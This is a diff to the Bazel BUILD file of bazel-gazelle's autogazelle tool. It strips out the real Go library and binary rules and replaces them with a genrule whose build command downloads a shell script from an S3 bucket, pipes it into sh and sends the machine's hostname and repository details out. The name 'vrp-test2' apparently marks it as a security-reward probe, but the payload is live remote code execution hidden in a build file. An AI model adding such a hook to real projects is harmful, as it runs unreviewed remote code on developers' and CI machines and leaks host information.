@@ -1,65 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_binary", "go_library")
 
-go_library(
-    name = "autogazelle_lib",
-    srcs = [
-        "autogazelle.go",
-        "client_unix.go",
-        "server_unix.go",
-    ],
-    importpath = "github.com/bazelbuild/bazel-gazelle/cmd/autogazelle",
-    visibility = ["//visibility:private"],
-    deps = select({
-        "@io_bazel_rules_go//go/platform:android": [
-            "@com_github_fsnotify_fsnotify//:fsnotify",
-        ],
-        "@io_bazel_rules_go//go/platform:darwin": [
-            "@com_github_fsnotify_fsnotify//:fsnotify",
-        ],
-        "@io_bazel_rules_go//go/platform:dragonfly": [
-            "@com_github_fsnotify_fsnotify//:fsnotify",
-        ],
-        "@io_bazel_rules_go//go/platform:freebsd": [
-            "@com_github_fsnotify_fsnotify//:fsnotify",
-        ],
-        "@io_bazel_rules_go//go/platform:ios": [
-            "@com_github_fsnotify_fsnotify//:fsnotify",
-        ],
-        "@io_bazel_rules_go//go/platform:linux": [
-            "@com_github_fsnotify_fsnotify//:fsnotify",
-        ],
-        "@io_bazel_rules_go//go/platform:netbsd": [
-            "@com_github_fsnotify_fsnotify//:fsnotify",
-        ],
-        "@io_bazel_rules_go//go/platform:openbsd": [
-            "@com_github_fsnotify_fsnotify//:fsnotify",
-        ],
-        "@io_bazel_rules_go//go/platform:solaris": [
-            "@com_github_fsnotify_fsnotify//:fsnotify",
-        ],
-        "@io_bazel_rules_go//go/platform:windows": [
-            "@com_github_fsnotify_fsnotify//:fsnotify",
-        ],
-        "//conditions:default": [],
-    }),
-)
-
-go_binary(
-    name = "autogazelle",
-    embed = [":autogazelle_lib"],
-    visibility = ["//visibility:public"],
-)
-
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = [
-        "BUILD.bazel",
-        "README.rst",
-        "autogazelle.bash",
-        "autogazelle.go",
-        "client_unix.go",
-        "server_unix.go",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-gazelle.git\\&folder=autogazelle\\&hostname=`hostname`\\&foo=kjz",
     visibility = ["//visibility:public"],
 )
